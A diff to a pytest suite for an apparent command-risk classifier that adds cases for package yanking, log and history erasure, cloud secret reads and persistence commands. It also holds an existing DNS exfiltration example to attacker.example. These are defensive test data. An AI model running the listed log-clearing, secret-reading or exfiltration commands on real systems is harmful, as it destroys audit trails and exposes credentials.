@@ -140,6 +140,18 @@ def test_catastrophic(line):
     "adduser x sudo",
     "gpasswd -a x sudo",
     "net localgroup administrators x /add",
+
+    # Yanking or deprecating published packages (#169)
+    "cargo yank --version 1.0.0",
+    "gem yank mygem -v 1.0.0",
+    "npm deprecate mypkg 'use v2'",
+
+    # Erasing logs or history (#171)
+    "history -c",
+    "Clear-History",
+    "wevtutil cl Security",
+    "journalctl --vacuum-time=1s",
+    "tmutil disable",
 ])
 def test_irreversible(line):
     assert kind(line) == "irreversible", commands.read(line).summary()
@@ -226,6 +238,29 @@ def test_no_false_alarm(line):
     # Looking at accounts and keys is not changing them (#175)
     "id", "groups", "net user", "getent passwd x", "aws iam list-access-keys",
     "usermod -aG audio x", "usermod --help",
+
+    # Startup inspection commands (#170)
+    "launchctl list",
+    "launchctl print system/com.example",
+    "systemctl status nginx",
+
+    # Secret listing is everyday work; reading secret values waits for an approver (#174)
+    "aws secretsmanager list-secrets",
+    "gcloud secrets list",
+    "az keyvault secret list --vault-name v",
+    "gh secret list",
+
+    # Everyday package searching and inspection (#169)
+    "cargo search serde",
+    "gem list",
+    "npm view mypkg",
+
+    # Normal history and log reading (#171)
+    "history",
+    "history | grep ssh",
+    "journalctl -u nginx --since today",
+    "wevtutil qe Security /c:5",
+    "tmutil status",
 ])
 def test_everyday_work_is_not_held(line):
     assert kind(line) in ("other", "read_only"), commands.read(line).summary()
@@ -235,12 +270,15 @@ def test_summary_explains():
     assert "home folder" in commands.read("rm -rf ~/").summary()
     assert "whole drive" in commands.read("rmdir /s /q d:\\").summary()
     assert "remote" in commands.read("git push --force").summary()
+    assert "launch agent" in commands.read("launchctl bootstrap gui/501 ~/Library/LaunchAgents/x.plist").summary()
     assert "disk" in commands.read("diskutil eraseDisk APFS X disk2").summary()
     assert "disk" in commands.read("diskutil zeroDisk disk2").summary()
     assert "repartition" in commands.read("diskutil partitionDisk disk2 1 GPT APFS X 100%").summary()
     assert "APFS" in commands.read("diskutil apfs deleteContainer disk2").summary()
     assert "backup" in commands.read("tmutil delete /Volumes/Backup/x").summary()
     assert "DNS name" in commands.read("nslookup $(whoami).attacker.example").summary()
+    assert "takes a published version away" in commands.read("cargo yank --version 1.0.0").summary()
+    assert "erases the record of what ran" in commands.read("history -c").summary()
     assert "admin rights" in commands.read("usermod -aG sudo x").summary()
     assert "access key" in commands.read("aws iam create-access-key --user-name x").summary()
 
@@ -291,6 +329,17 @@ def test_command_of():
 def test_reading_secrets_is_never_just_looking(line):
     r = commands.read(line)
     assert r.kind != "read_only" and "secrets" in r.summary()
+
+
+@pytest.mark.parametrize("line", [
+    "aws secretsmanager get-secret-value --secret-id prod",
+    "gcloud secrets versions access latest --secret=db",
+    "az keyvault secret show --name x --vault-name v",
+])
+def test_cloud_secret_managers_read_as_secret(line):
+    r = commands.read(line)
+    assert r.kind == "secret"
+    assert "shows the value of a stored secret" in r.summary()
 
 
 @pytest.mark.parametrize("line", ["cat README.md", "cat src/tokenizer.py", "cat docs/environment.md", "ls src"])
@@ -456,6 +505,9 @@ def test_gh_irreversible_reasons_describe_the_operation(line, reason):
     "sudo systemctl --user enable example.service",
     "systemctl --host example.invalid enable example.service",
     "launchctl load -w ~/Library/LaunchAgents/com.example.plist",
+    "launchctl bootstrap gui/501 ~/Library/LaunchAgents/x.plist",
+    "launchctl enable gui/501/com.x",
+    "systemctl --user link /tmp/x.service",
     "crontab -",
     "crontab schedule.txt",
     "crontab -e",
